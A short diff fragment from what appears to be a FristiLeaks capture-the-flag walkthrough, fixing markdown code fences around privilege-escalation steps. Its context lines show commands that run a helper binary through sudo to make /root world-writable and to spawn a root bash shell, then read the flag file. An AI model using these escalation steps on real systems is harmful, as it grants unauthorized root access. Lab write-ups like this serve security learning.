@@ -48,7 +48,8 @@ sudo -u fristi ./doCom chmod -R 777 /root
 or
 ```shell
 sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom /bin/bash
-
+```
+```
 Final:
 bash-4.1# cat fristileaks_secrets.txt
 cat fristileaks_secrets.txt
